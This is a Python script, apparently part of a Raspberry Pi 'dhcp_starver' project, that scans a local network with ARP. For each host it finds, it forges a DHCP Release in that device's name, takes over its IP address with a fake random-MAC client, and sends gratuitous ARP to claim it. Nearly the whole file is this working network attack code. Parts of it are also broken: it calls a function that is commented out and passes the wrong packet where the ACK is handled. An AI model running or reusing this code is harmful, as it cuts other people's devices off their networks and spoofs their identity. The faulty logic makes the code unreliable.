# dhcp.spoof.py
# Performs a targeted ARP Request scan to find existing hosts connected to network and "steal" their IP addresses
# 1. 
# 2. 
#### IMPORTS #### -------------------------------------------------------------------
import scapy.all as scapy
import netifaces
import ipaddress
import time
import json
import threading
import logging
from logging.handlers import TimedRotatingFileHandler
import random
from datetime import datetime
import subprocess


#### CONFIG #### -------------------------------------------------------------------
iface = "eth0"  # Network interface to spoof
timeout_to_receive_arp_reply = 5 # Time to wait to receive ARP Reply (seconds)
timeout_to_receive_dhcp_response = 30 # seconds
time_to_wait_between_release_and_discover = 5 # seconds
#delay_between_arp_scans = 120  # seconds
json_file = "/home/pi/dhcp_starver/spoofed_hosts.json"
log_file = "/home/pi/dhcp_starver/logs/dhcp_spoof.log"


#### GLOBAL VARIABLES #### ---------------------------------------------------------
# Dict of all spoofed ip addresses k:IP, v:fake_host
spoofed_ip_dict = dict()

# DHCP Server's IP and MAC address
dhcp_server_ip = ""
dhcp_server_mac = ""

# Our own device's network parameters
our_ip_address = ""
our_mac_address = ""
our_netmask = ""
our_network = ""


#### EXTRA GLOBAL STUFF #### ------------------------------------------------------
class fake_host:
    """
    Defines basic parameters of a host
    """
    def __init__(self, mac_address, transaction_id):
        self.ip_address = None
        self.mac_address = mac_address
        self.transaction_id = transaction_id
        self.hostname = "elvispresley"
        self.lease_time = None  # IP Address Lease Time offered by DHCP Server
        self.acquisition_time = None  # Time when IP Address was obtained/renewed
        self.is_spoofed = False  # Sets if this host has acquired successfully the IP Address
        self.is_server = False # True when this IP address if from DHCP server's network
    def to_dict(self):
        return {
            "ip_address" : self.ip_address,
            "mac_address" : self.mac_address,
            "transaction_id" : self.transaction_id,
            "hostname" : self.hostname,
            "lease_time" : self.lease_time,
            "acquisition_time" : self.acquisition_time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_spoofed" : self.is_spoofed,
            "is_server" : self.is_server
        }
    @classmethod
    def from_dict(cls, data):
        instance = cls(mac_address=data["mac_address"], transaction_id=data["transaction_id"])
        instance.ip_address = data["ip_address"]
        instance.hostname = data["hostname"]
        instance.lease_time = data["lease_time"]
        instance.acquisition_time = datetime.strptime(data["acquisition_time"], "%Y-%m-%d %H:%M:%S")
        instance.is_spoofed = data["is_spoofed"]
        instance.is_server = data["is_server"]
        return instance

# Define a semaphore for .log/.json file access without collision
file_semaphore = threading.Semaphore()

# Set up logging with rotation policy
handler = TimedRotatingFileHandler(log_file, when="midnight", interval=1, backupCount=7, encoding='utf-8', utc=True)
handler.suffix = "%Y-%m-%d"
handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger = logging.getLogger()
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# Set up scapy logger to error
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


#### FUNCTIONS #### ----------------------------------------------------------------
def write_to_log(message):
    """
    Write message to log file
    """
    with file_semaphore:
        logger.info(message)


def get_random_mac():
    """
    Returns a string with a "random" MAC address
    """
    mac = "34:" # Our bogus MAC addresses starts with 34 to make it easier to track/debug
    for i in range(10):
        num = random.randint(0, 15)
        if num < 10:
            num = chr(48 + num)
        else:
            num = chr(87 + num)
        mac += num
        if i % 2 == 1:
            mac += ":"
    return mac[:-1]


def get_unspoofed_ips(network_ip_addresses):
    """
    Compares avalaible ip addresses with spoofed ips to return a list with non spoofed IP addresses
    """
    try:
        # Iterating for every fake_host in the dictionary
        for ip, host in spoofed_ip_dict.items():
            # Check if host is spoofed or is DHCP server
            if host.is_spoofed or host.is_server:
                # Remove IP address from all IP addresses list
                network_ip_addresses.remove(ip)
        return network_ip_addresses
    except:
        # If an error occurs, return the whole address list
        return network_ip_addresses


def create_fake_host():
    """
    Creates a fake host with random MAC address and Trans ID
    """
    # Getting fresh random MAC addr and transaction ID for all the DHCP transaction process for this fake host
    trans_id = random.getrandbits(32)
    mac_address = get_random_mac()
    # Creating a new fake host with no assigned IP address 
    host = fake_host(mac_address, trans_id)
    return host


def create_dhcp_discover_packet(host):
    """
    Creates a broadcast DHCP Discover with host's parameters
    """
    mac_address = host.mac_address
    trans_id = host.transaction_id
    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
    host_mac = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Discover packet
    ether_header = scapy.Ether(src=host_mac, 
                               dst="ff:ff:ff:ff:ff:ff")
    ip_header = scapy.IP(src="0.0.0.0", 
                         dst="255.255.255.255")
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=host_mac, 
                              xid=trans_id,
                              flags=0) # Unicast
                              #flags=0x8000) # Broadcast
    dhcp_field = scapy.DHCP(options=[("message-type", "discover"),
                                     ("client_id", b'\x01' + host_mac),
                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),  
                                     ("hostname", host.hostname), 
                                     "end"])
    dhcp_discover = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    return dhcp_discover


def release_and_catch(host_mac, host_ip):
    """
    Release device's IP address and try to assign it to a fake host
    """
    # Send DHCP Release to force a new IP address adquisition by the host
    send_release(host_mac, host_ip)
    # Wait for t seconds and try to catch that released IP address
    time.sleep(time_to_wait_between_release_and_discover)
    # Create a new ficticious host and adds it to the dictionary
    fake_host = create_fake_host()
    #global fake_host_dict
    #fake_host_dict[fake_host.mac_address] = fake_host
    #global spoofed_ip_dict
    # Sending discover
    dhcp_discover_packet = create_dhcp_discover_packet(fake_host)
    scapy.sendp(dhcp_discover_packet, verbose=False, iface=iface)
    write_to_log(f"DHCP Discover sent: {fake_host.mac_address} requesting a new IP address")
    dhcp_discover_response = scapy.sniff(iface=iface, filter="udp and (port 67 or port 68)", count=1, store=1, timeout=timeout_to_receive_dhcp_response)
    
    if dhcp_discover_response:
        # If there's response and if's an Offer, update fake_host IP address. If not, return None
        updated_fake_host = handle_dhcp_response(dhcp_discover_response[0], fake_host)
    else:
        write_to_log(f"Timeout exceeded: Non Discover response received")


    # If Discover-Offer occurs, continue with DORA handshake
    if updated_fake_host != None:
        write_to_log(f"DHCP Offer received: {fake_host.mac_address} offered {fake_host.ip_address}")
        dhcp_request_packet = create_broadcast_dhcp_request_packet(fake_host)
        scapy.sendp(dhcp_request_packet, verbose=False, iface=iface)
        write_to_log(f"DHCP Request sent: {fake_host.mac_address}")
        dhcp_request_response = scapy.sniff(iface=iface, filter="udp and (port 67 or port 68)", count=1, store=1, timeout=timeout_to_receive_dhcp_response)

        if dhcp_request_response:
            # If there's a response to our request, check if it's ACK or NAK and update fake_host information
            final_fake_host = handle_dhcp_response(dhcp_discover_response[0], updated_fake_host)
            if final_fake_host != None:
                # DORA handshake successfull. Saving host to dictionary and continue with spoofing
                global spoofed_ip_dict
                spoofed_ip_dict[final_fake_host.ip_address] = final_fake_host
                # Saving new host to json file
                try:
                    host_dict = load_from_json(json_file)
                except FileNotFoundError:
                    write_to_log(f"File not found: {json_file}")
                    host_dict = {}
                except json.JSONDecodeError as e:
                    write_to_log(f"Error decoding JSON file: {e}")
                    host_dict = {}
                #host_dict = load_from_json(json_file)
                host_dict[final_fake_host.ip_address] = final_fake_host
                save_results_to_json(host_dict, json_file)

                send_gratuitous_arp(fake_host.mac_address, host_ip)

            else:
                write_to_log(f"Error: Unable to obtain an IP address to {fake_host.mac_address}")
                
        else: 
            write_to_log(f"Timeout exceeded: Non Request response received")

'''
def create_broadcast_dhcp_request_packet(host):
    """
    Creates a broadcast DHCP Discover with host's parameters
    """
    trans_id = host.transaction_id
    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
    mac_address = int(host.mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Request packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst="ff:ff:ff:ff:ff:ff")
    ip_header = scapy.IP(src="0.0.0.0", 
                         dst="255.255.255.255")
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address, 
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "request"),
                                     ("client_id", b'\x01' + mac_address),
                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),
                                     ("requested_addr", host.ip_address), 
                                     ("hostname", host.hostname),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
    return dhcp_request
'''

def handle_dhcp_response(packet, fake_host):
    """
    Handles response to DHCP Request packet
    """
    global spoofed_ip_dict
    global dhcp_server_ip, dhcp_server_mac

    # Option 2: DHCP Offer (response to Discover)
    if scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 2:
        # Getting client info from BOOTP header - RFC951
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        host_ip = packet[scapy.BOOTP].yiaddr
        # Check if packet is for us. If not, captured DHCP Offer is discarded
        if host_mac.lower() != fake_host.mac_address:
            return None
        # Updating the fake host's IP address
        fake_host.ip_address = host_ip
        # Getting DHCP server info
        dhcp_opts = get_dhcp_options(packet)
        dhcp_server_ip = dhcp_opts["server_id"] 
        dhcp_server_mac = packet[scapy.Ether].src

        return fake_host

    # Option 5: DHCP ACK, IP address successfully linked to host by router's DHCP server        
    if scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 5:
        # Getting client info - RFC951
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        host_ip = packet[scapy.BOOTP].yiaddr
        # Check if packet is not for us. Only captured if device is connected to a mirror port or broadcast ACK
        if host_mac == fake_host.mac_address or host_mac == our_mac_address:
            write_to_log(f"Received unknown DHCP ACK: {host_ip} linked to {host_mac}")
            return None
        # Updating the fake host's attributes with DHCP server's final decision
        dhcp_opts = get_dhcp_options(packet)
        fake_host.ip_address = host_ip
        fake_host.lease_time = dhcp_opts['lease_time']
        fake_host.acquisition_time = datetime.now()
        fake_host.is_spoofed = True
        # Updating DHCP server's params
        dhcp_server_ip = dhcp_opts["server_id"] 
        dhcp_server_mac = packet[scapy.Ether].src
        write_to_log(f"ACK received: {host_ip} successfully linked to {host_mac}")

        return fake_host
    
    # Option 6: DHCP NAK, unable to obtain a dynamic IP address
    elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 6:
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        write_to_log(f"NAK received: {host_mac} IP address' acquisition rejected")

        return None
    
    #return None


def get_dhcp_options(packet):
    """
    Returns a dict with the DHCP packet's DHCP Options
    """
    dhcp_opts = packet.getlayer(scapy.DHCP).fields["options"]
    dhcp_opts_dict = dict()
    for opt in dhcp_opts:
        # Obtaining all DHCP options until option "end"
        if opt == "end":
            break
        if isinstance(opt, tuple):
            # Ignoring other variables inside a same option, like 2nd DNS Servers, etc. Not useful right now
            dhcp_opts_dict[opt[0]] = opt[1]
        else:
            pass
    return dhcp_opts_dict


def mac_to_str(bytes_value):
    """
    Converts bytes sequence to standard hex MAC address format (ff:ff:ff:ff:ff:ff)
    """
    hex_string = ''.join('{:02x}'.format(byte) for byte in bytes_value)
    formatted_mac_address = ':'.join(hex_string[i:i+2] for i in range(0, 12, 2))
    return formatted_mac_address


def send_release(host_mac, ip_address):
    """
    Send DHCP Release
    """
    # Getting a random Trans ID
    trans_id = random.getrandbits(32)
    # Converting MAC addresses
    mac_address = int(host_mac.replace(":", ""), 16).to_bytes(6, "big")
    server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Release packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst=server_mac)
    ip_header = scapy.IP(src=ip_address, 
                         dst=dhcp_server_ip)
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address,
                              ciaddr=ip_address,
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "release"),
                                     ("server_id", dhcp_server_ip),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, verbose=False, iface=iface)
    write_to_log(f"Releasing IP address {ip_address} from {host_mac}")


def send_gratuitous_arp(host_mac, host_ip):
    """
    Send an ARP Request announcing defined IP-MAC association
    """
    ether_header = scapy.Ether(src=host_mac, 
                               dst="ff:ff:ff:ff:ff:ff")
    arp_header = scapy.ARP(op=2, # 1=Request, 2=Reply 
                           pdst=host_ip, 
                           psrc=host_ip, 
                           hwsrc=host_mac)
    arp_request = ether_header/arp_header
    # Send 3 Gratuitous ARPs trying to force an IP renewal on the connected device
    for _ in range(3):
        scapy.sendp(arp_request, verbose=False, iface=iface)
    write_to_log(f"Sending Gratuitous ARP announcing {host_mac} - {host_ip}")


def arp_scan(target_ips):
    """
    Performs a targeted ARP request scan to find existing hosts on the network.
    Returns a list with hosts' (IP, MAC) tuples who have answered
    """
    # ARP Request packet, one for every unspoofed ip address
    arp_requests = [scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip) for ip in target_ips]
    # Send it and catch ARP Reply response(s)
    result, _ = scapy.srp(arp_requests, timeout=timeout_to_receive_arp_reply, verbose=False)

    # List to save hosts' (IP, MAC) tuples who have answered
    responsive_ips = []
    # For every response, checks if it's an ARP response and saves the responding host params
    for _ , received in result:
        if received.haslayer(scapy.ARP):
            arp_layer = received[scapy.ARP]
            # Checking if it's Reply
            if arp_layer.op == 2:
                ip_address = received.psrc
                mac_address = received.hwsrc.lower()
                responsive_ips.append((ip_address, mac_address.lower()))
    '''
    # Checks if someone of this hosts is the router/DHCP server
    for (ip, mac) in responsive_ips:
        is_router = check_if_router(ip)
        if is_router:
            global dhcp_server_ip, dhcp_server_mac
            dhcp_server_ip = ip
            dhcp_server_mac = mac
    '''
    return responsive_ips
  

def get_dhcp_leases():
    """
    Reads /etc/pihole/dhcp.leases and loads its content to a dictionary
    That file contains PiHole's DHCP Server leased IP addresses and some information about every host
    """
    dhcp_leases = {}
    with open("/etc/pihole/dhcp.leases", 'r') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) >= 5:
                #timestamp = parts[0]
                mac_address = parts[1]
                ip_address = parts[2]
                hostname = parts[3]
                #if len(parts) > 4:
                #    hostname += " " + " ".join(parts[4:])
                #dhcp_leases[mac_address] = {'timestamp': timestamp, 'ip_address': ip_address, 'hostname': hostname}
                dhcp_leases[mac_address] = {'ip_address': ip_address, 'hostname': hostname}
    return dhcp_leases





'''
def check_if_router(ip_address):
    """
    Check if that IP address belongs to home network's router/DHCP server
    """
    try:
        # Execute the 'ip route' command
        route_output = subprocess.check_output(['/usr/sbin/ip', 'route', 'get', '8.8.8.8'], text=True)
        return ip_address in route_output
    except subprocess.CalledProcessError:
        return False
    
'''
def load_from_json(file_path):
    """
    Load json file contents to a dictionary
    """
    # Load json contents to a dictionary
    write_to_log(f"Loading results from {file_path}")
    with file_semaphore:
        with open(file_path, 'r') as file:
            data = json.load(file)
    # Create fake_host dict with fake_host objects
    spoofed_host_dict = {}
    for ip, host_data in data.items():
        spoofed_host_dict[ip] = fake_host.from_dict(host_data)
    return spoofed_host_dict


def save_results_to_json(results, file_path):
    """
    Saves fake_host dictionary to a json file
    """
    serializable_dict = {mac: host.to_dict() for mac, host in results.items()}
    with file_semaphore:
        with open(file_path, 'w') as json_file:
            json.dump(serializable_dict, json_file, indent=4)


def get_network_params(iface_name):
    """
    Get IP address, MAC address, netmask and network address from selected interface
    """
    try:
        iface = netifaces.ifaddresses(iface_name)
        ip_address = iface[netifaces.AF_INET][0]['addr']
        mac_address = iface[netifaces.AF_LINK][0]['addr']
        network_mask = iface[netifaces.AF_INET][0]['netmask']
        # Obtaining network address
        network_address = ipaddress.ip_network(f"{ip_address}/{network_mask}", strict=False)
        return ip_address, mac_address, network_mask, str(network_address)
        #return ip_address, mac_address, network_mask
    except (KeyError, IndexError):
        return None, None, None, None


def get_hosts_from_network(ip_address, netmask):
    """
    Returns a list of all possible assignable IP addresses to hosts on the interface network
    """
    network = ipaddress.IPv4Network(ip_address + "/" + netmask, strict=False)
    # List of avalaible addresses
    address_list = [str(ip_address) for ip_address in network.hosts()] 
    return address_list


def main():

    write_to_log(f"Starting ARP Request scan")
    # Get network interface assigned IP address and network network mask
    global our_ip_address, our_netmask
    our_ip_address, _, our_netmask, _ = get_network_params(iface)
    
    # Getting all host avalaible IP addresses for network
    network_ip_addresses = get_hosts_from_network(our_ip_address, our_netmask)

    # Load previous spoofed hosts from json file
    global spoofed_ip_dict
    try:
        write_to_log(f"Loading previous results from {json_file}")
        spoofed_ip_dict = load_from_json(json_file)
    except FileNotFoundError:
        write_to_log(f"File not found: {json_file}")
        spoofed_ip_dict = {}
    except json.JSONDecodeError as e:
        write_to_log(f"Error decoding JSON file: {e}")
        spoofed_ip_dict = {}

    # Get a list with non spoofed host's IP addresses checking spoofed_ip_dict
    target_ips = get_unspoofed_ips(network_ip_addresses)
    # Perform an ARP scan
    ip_mac_data = arp_scan(target_ips)
    # Getting Pi-hole DHCP Server's IP lease list
    spoofed_hosts = get_dhcp_leases()

    
    for ip, mac in ip_mac_data:
        # Checking if discovered host is not already spoofed
        if mac not in spoofed_hosts.keys():
            write_to_log(f"ARP Scan: Found non-spoofed host {ip} - {mac}")
            # Try to release that host IP address and kidnap it
            release_and_catch(mac, ip)
    
    

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt as e:
        write_to_log(f"Service terminated")